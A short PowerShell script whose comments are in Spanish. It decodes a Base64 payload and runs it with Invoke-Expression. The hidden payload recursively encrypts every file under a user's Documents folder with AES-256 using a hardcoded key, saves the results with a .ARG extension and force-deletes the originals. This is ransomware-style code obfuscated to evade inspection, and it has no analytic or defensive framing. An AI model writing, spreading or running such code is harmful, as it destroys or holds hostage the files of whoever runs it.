$Base64String="JGZvbGRlclBhdGg9IiV1c2VycHJvZmlsZSVcRG9jdW1lbnRzIg0KJENsYXZlPSJIb2xhTXVuZG8iDQoNCiMgVmVyaWZpY2FyIHNpIGxhIGNhcnBldGEgZXhpc3RlDQppZiAoLU5vdCAoVGVzdC1QYXRoIC1QYXRoICRmb2xkZXJQYXRoKSkgew0KICAgIFdyaXRlLUhvc3QgIkxhIGNhcnBldGEgZXNwZWNpZmljYWRhIG5vIGV4aXN0ZS4iDQogICAgZXhpdA0KfQ0KDQojIENvbnZpZXJ0ZSBsYSBjbGF2ZSBlbiBieXRlcyB5IGdlbmVyYSB1bmEgY2xhdmUgZGUgMjU2IGJpdHMgKDMyIGJ5dGVzKQ0KJGNsYXZlQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRDbGF2ZSkNCmlmICgkY2xhdmVCeXRlcy5MZW5ndGggLWx0IDMyKSB7DQogICAgJGNsYXZlQnl0ZXMgPSAkY2xhdmVCeXRlcyArICgwLi4oMzEgLSAkY2xhdmVCeXRlcy5MZW5ndGgpIHwgRm9yRWFjaC1PYmplY3QgeyAwIH0pDQp9IGVsc2VpZiAoJGNsYXZlQnl0ZXMuTGVuZ3RoIC1ndCAzMikgew0KICAgICRjbGF2ZUJ5dGVzID0gJGNsYXZlQnl0ZXNbMC4uMzFdDQp9DQoNCiMgR2VuZXJhIHVuIElWIGFsZWF0b3JpbyBkZSAxNiBieXRlcw0KJGl2ID0gTmV3LU9iamVjdCBieXRlW10gMTYNCltTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJhbmRvbU51bWJlckdlbmVyYXRvcl06OkNyZWF0ZSgpLkdldEJ5dGVzKCRpdikNCg0KIyBFbnVtZXJhciB0b2RvcyBsb3MgYXJjaGl2b3MgZW4gbGEgY2FycGV0YSB5IHN1YmNhcnBldGFzDQokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRmb2xkZXJQYXRoIC1SZWN1cnNlIC1GaWxlDQoNCiMgR2VuZXJhciBsYSBsaXN0YSBkZSBydXRhcyBjb21wbGV0YXMNCmZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykgew0KDQokQXJjaGl2bz0kZmlsZS5GdWxsTmFtZQ0KDQojIENyZWEgZWwgb2JqZXRvIEFFUw0KJGFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpDQokYWVzLktleVNpemUgPSAyNTYNCiRhZXMuQmxvY2tTaXplID0gMTI4DQokYWVzLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDDQokYWVzLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3DQokYWVzLktleSA9ICRjbGF2ZUJ5dGVzDQokYWVzLklWID0gJGl2DQoNCiMgTGVlIGVsIGNvbnRlbmlkbyBkZWwgYXJjaGl2byBvcmlnaW5hbA0KJGNvbnRlbmlkbyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkQXJjaGl2bykNCg0KIyBDaWZyYSBlbCBjb250ZW5pZG8NCiRlbmNyeXB0b3IgPSAkYWVzLkNyZWF0ZUVuY3J5cHRvcigpDQokY29udGVuaWRvQ2lmcmFkbyA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkY29udGVuaWRvLCAwLCAkY29udGVuaWRvLkxlbmd0aCkNCg0KIyBDb21iaW5hIGVsIElWIHkgZWwgY29udGVuaWRvIGNpZnJhZG8NCiRzYWxpZGEgPSBOZXctT2JqZWN0IGJ5dGVbXSAoJGl2Lkxlbmd0aCArICRjb250ZW5pZG9DaWZyYWRvLkxlbmd0aCkNCltBcnJheV06OkNvcHkoJGl2LCAwLCAkc2FsaWRhLCAwLCAkaXYuTGVuZ3RoKQ0KW0FycmF5XTo6Q29weSgkY29udGVuaWRvQ2lmcmFkbywgMCwgJHNhbGlkYSwgJGl2Lkxlbmd0aCwgJGNvbnRlbmlkb0NpZnJhZG8uTGVuZ3RoKQ0KDQojIEd1YXJkYSBlbCBhcmNoaXZvIGNpZnJhZG8gY29uIGxhIGV4dGVuc2nDs24gLkFSRw0KJHJ1dGFTYWxpZGEgPSAiJEFyY2hpdm8uQVJHIg0KW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkcnV0YVNhbGlkYSwgJHNhbGlkYSkNCg0KUmVtb3ZlLUl0ZW0gLVBhdGggJEFyY2hpdm8gLUZvcmNlDQoNCldyaXRlLU91dHB1dCAiQXJjaGl2byBjaWZyYWRvIGd1YXJkYWRvIGNvbW86ICRydXRhU2FsaWRhIg0KfQ=="

try {
    # Decodificar la cadena Base64
    $decodedBytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

    Invoke-Expression $decodedString
}
catch {
    Write-Error "Error al decodificar o ejecutar la cadena: $_"
}
